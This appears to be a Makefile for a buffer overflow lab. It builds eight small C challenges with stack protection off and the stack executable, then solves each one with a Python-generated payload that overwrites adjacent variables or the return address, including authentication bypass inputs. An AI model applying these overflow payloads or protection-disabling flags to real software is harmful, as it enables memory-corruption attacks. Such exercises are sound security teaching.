
CFLAGS = -m32 -fno-stack-protector -z execstack -Wno-implicit-function-declaration

files = $(find *.c)

all: clean compile solve


compile:
	gcc $(CFLAGS) 0-simple.c -o 0-simple.exe
	gcc $(CFLAGS) 1-match.c -o 1-match.exe
	gcc $(CFLAGS) 2-functions.c -o 2-functions.exe
	gcc $(CFLAGS) 3-return.c -o 3-return.exe
	gcc $(CFLAGS) 4-auth.c -o 4-auth.exe
	gcc $(CFLAGS) 5-auth2.c -o 5-auth2.exe
	gcc $(CFLAGS) 6-code.c -o 6-code.exe
	gcc $(CFLAGS) 7-environment.c -o 7-environment.exe
	gcc $(CFLAGS) test-shellcode-32.c -o test-shellcode-32.exe


solve:
	@echo "\n0"
	python -c 'print "A"*65' | ./0-simple.exe

	@echo "\n1"
	./1-match.exe $$(python -c 'print "A"*64+"\x64\x63\x62\x61"')

	@echo "\n2"
	-python -c 'print "A"*64+"\xd0\x55\x55\x56"' | ./2-functions.exe

	@echo "\n3"
	-python -c 'print "A"*64+"\xd0\x55\x55\x56"' | ./3-return.exe

	@echo "\n4"
	./4-auth.exe $$(python -c 'print "user "+"A"*16+"\x01\x00\x00\x00"')

	# why does it work?
	@echo "\n5"
	./5-auth2.exe $$(python -c 'print "user "+"A"*16+"\x01\x00\x00\x00"')

	@echo "\n6"
	python -c 'print "A"*64+"\xd0\x55\x55\x56"' | ./6-code.exe

	@echo "\n7"
	python -c 'print "A"*1+"\xd0\x55\x55\x56"' | ./7-environment.exe

	@echo

clean:
	rm -f *.exe

